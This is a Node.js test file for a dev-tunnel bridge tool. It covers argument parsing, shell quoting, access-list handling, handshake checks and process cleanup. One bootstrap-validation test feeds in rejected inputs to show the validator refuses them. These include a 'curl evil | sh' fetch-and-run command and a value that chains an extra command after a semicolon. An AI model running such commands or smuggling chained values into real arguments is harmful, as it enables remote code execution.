import test from 'node:test';
import assert from 'node:assert/strict';
import net from 'node:net';
import { once } from 'node:events';
import { randomBytes } from 'node:crypto';
import { spawn } from 'node:child_process';
import { chmodSync, mkdtempSync, existsSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createBridge, readLine, forwardingPort, validateBootstrap, parseArgs, shellQuote, accessEntries } from '../herdr-devtunnel.mjs';

const main = fileURLToPath(new URL('../herdr-devtunnel.mjs', import.meta.url));
const fakeHc = fileURLToPath(new URL('./fixtures/fake-hc.mjs', import.meta.url));
const fakeTunnel = fileURLToPath(new URL('./fixtures/fake-devtunnel.mjs', import.meta.url));
chmodSync(fakeHc, 0o755); chmodSync(fakeTunnel, 0o755);
const bootstrap = session => `sh -c 'p=$(command -v herdr-core) || p=$HOME/.local/bin/herdr-core; [ -x "$p" ] || { echo "herdr-core is not installed here" >&2; exit 127; }; ${session ? `HC_SESSION=${session} ` : ''}exec "$p" connect'`;
const handshake = JSON.stringify({ protocol: 'herdr-devtunnel/1', session: 'default' }) + '\n';
const delay = ms => new Promise(r => setTimeout(r, ms));
async function waitFor(fn, timeout = 5000) {
  const end = Date.now() + timeout;
  while (Date.now() < end) { if (fn()) return; await delay(20); }
  throw new Error('waitFor timed out');
}
async function bridge(t) {
  const server = createBridge({ hc: fakeHc });
  server.listen(0, '127.0.0.1'); await once(server, 'listening');
  t.after(() => server.stop());
  return server.address().port;
}
async function socketTo(port, t) {
  const socket = net.createConnection({ host: '127.0.0.1', port, allowHalfOpen: true });
  socket.on('error', () => {}); t.after(() => socket.destroy());
  await once(socket, 'connect'); return socket;
}

test('CLI parsing, quoting and port mapping are strict', () => {
  assert.equal(parseArgs(['--port', '123', '--create']).port, '123');
  assert.throws(() => parseArgs(['--allow-anonymous']));
  assert.equal(shellQuote("a'b"), "'a'\\''b'");
  assert.equal(forwardingPort('SSH: Forwarding from 127.0.0.1:53123 to host port 43821.', 43821), 53123);
  assert.equal(forwardingPort('SSH: Forwarding from [::1]:53123 to host port 43821.', 43821), null);
  assert.equal(forwardingPort('SSH: Forwarding from 127.0.0.1:53123 to host port 22.', 43821), null);
});
test('ACL extraction handles official CLI arrays and SDK objects, fails closed otherwise', () => {
  assert.deepEqual(accessEntries([]), []);
  assert.deepEqual(accessEntries({ entries: [{ type: 'anonymous' }] }), [{ type: 'anonymous' }]);
  assert.deepEqual(accessEntries(['anonymous']), ['anonymous']);
  assert.throws(() => accessEntries('anonymous'));
});
test('only known hc bootstrap and matching session are allowed', () => {
  validateBootstrap(bootstrap()); validateBootstrap(bootstrap('default'));
  validateBootstrap(bootstrap('work'), 'work');
  assert.throws(() => validateBootstrap(bootstrap('work')));
  for (const line of ['uname -sm', 'curl evil | sh', bootstrap() + '; echo bad', 'hc connect', 'cmd /c echo test']) {
    assert.throws(() => validateBootstrap(line));
  }
});
test('readLine preserves coalesced bytes', async t => {
  const server = net.createServer(s => s.end('hello\nrest'));
  server.listen(0, '127.0.0.1'); await once(server, 'listening'); t.after(() => server.close());
  const socket = await socketTo(server.address().port, t);
  assert.equal(await readLine(socket), 'hello');
  const bytes = []; socket.on('data', b => bytes.push(b)); socket.resume(); await once(socket, 'end');
  assert.equal(Buffer.concat(bytes).toString(), 'rest');
});
test('bridge binary transparency, fragmented handshake and half close', { skip: process.platform === 'win32', timeout: 10000 }, async t => {
  const socket = await socketTo(await bridge(t), t);
  const replyPromise = readLine(socket);
  socket.write(handshake.slice(0, 7)); socket.write(handshake.slice(7));
  assert.equal(JSON.parse(await replyPromise).ok, true);
  const bytes = randomBytes(2 * 1024 * 1024), output = [];
  socket.on('data', b => output.push(b)); socket.resume(); socket.end(bytes);
  await once(socket, 'end'); assert.deepEqual(Buffer.concat(output), bytes);
});
test('bridge rejects HTTP, wrong session and oversized handshake', { timeout: 5000 }, async t => {
  const port = await bridge(t);
  for (const input of ['GET / HTTP/1.1\r\n', '{"protocol":"herdr-devtunnel/1","session":"other"}\n', 'x'.repeat(4097)]) {
    const socket = await socketTo(port, t);
    const ended = new Promise(resolve => { socket.once('end', resolve); socket.once('close', resolve); });
    socket.write(input); socket.resume(); await ended; socket.destroy();
  }
});
test('connector stdout contains protocol bytes only', { skip: process.platform === 'win32', timeout: 10000 }, async t => {
  const port = await bridge(t);
  const child = spawn(process.execPath, [main, 'connect', '--local-port', String(port), bootstrap()]);
  t.after(() => child.kill());
  const output = [], errors = [];
  child.stdout.on('data', b => output.push(b)); child.stderr.on('data', b => errors.push(b));
  const bytes = randomBytes(1024 * 1024); child.stdin.end(bytes);
  const [code] = await once(child, 'close');
  assert.equal(code, 0, Buffer.concat(errors).toString()); assert.deepEqual(Buffer.concat(output), bytes);
});
test('killing connector also reaps official CLI via lifetime supervisor', { skip: process.platform === 'win32', timeout: 12000 }, async t => {
  const port = await bridge(t), dir = mkdtempSync(join(tmpdir(), 'hdt-test-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const pidfile = join(dir, 'pid'), stopfile = join(dir, 'stopped');
  const child = spawn(process.execPath, [main, 'connect', '--tunnel', 'fixture.use2', '--devtunnel', fakeTunnel, bootstrap()], {
    env: { ...process.env, TEST_LOCAL_PORT: String(port), TEST_PID_FILE: pidfile, TEST_STOP_FILE: stopfile },
  });
  child.stdout.resume(); child.stderr.resume();
  t.after(() => { child.kill(); if (existsSync(pidfile)) { try { process.kill(Number(readFileSync(pidfile)), 'SIGKILL'); } catch {} } });
  await waitFor(() => existsSync(pidfile)); await delay(200);
  child.kill('SIGKILL'); await once(child, 'exit');
  await waitFor(() => existsSync(stopfile));
  await waitFor(() => { try { process.kill(Number(readFileSync(pidfile)), 0); return false; } catch { return true; } });
});
